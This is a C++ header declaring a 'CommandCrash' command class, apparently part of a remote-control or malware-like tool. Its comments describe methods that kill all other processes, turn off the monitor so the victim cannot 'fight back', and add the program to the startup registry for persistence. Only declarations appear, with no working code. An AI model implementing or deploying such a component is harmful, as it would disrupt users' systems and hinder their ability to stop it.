#pragma once

#include <Windows.h>
#include <thread>
#include <processthreadsapi.h>
#include <process.h>
#include <Tlhelp32.h>
#include <winbase.h>
#include <string.h>
#include <Psapi.h>
#include <algorithm>

/// <summary>
/// Crashes the system.
/// </summary>
class CommandCrash : public ICommand
{
public:
	CommandCrash();
	~CommandCrash();

	bool shouldRunThisCommand(ParsedCommand* Parsed);

	void run(ParsedCommand* Parsed);

	string* getName();

	string* getHelp();

private:

	/// <summary>
	/// Kills all processes it can besides itself.
	/// </summary>
	void AttackProcesses();

	/// <summary>
	/// Turns off the moniter. Really hard to fight back when you can't see your screen.
	/// Only power users are able to do anything at this point.
	/// </summary>
	void turnOffMoniter();

	/// <summary>
	/// Registers the program to the startup registry. Rather- It tells someone else to do it.
	/// </summary>
	void RegisterProgram();

	/// <summary>
	/// Registers the program to the startup registry.
	/// </summary>
	/// <param name="pszAppName"></param>
	/// <param name="pathToExe"></param>
	/// <param name="args"></param>
	/// <returns></returns>
	bool RegisterMyProgramForStartup(wchar_t* pszAppName, wchar_t* pathToExe, wchar_t* args);

	/// <summary>
	/// Detects if the program is registered to startup automatically.
	/// </summary>
	/// <param name="pszAppName"></param>
	/// <returns></returns>
	bool CommandCrash::IsMyProgramRegisteredForStartup(wchar_t* pszAppName);
};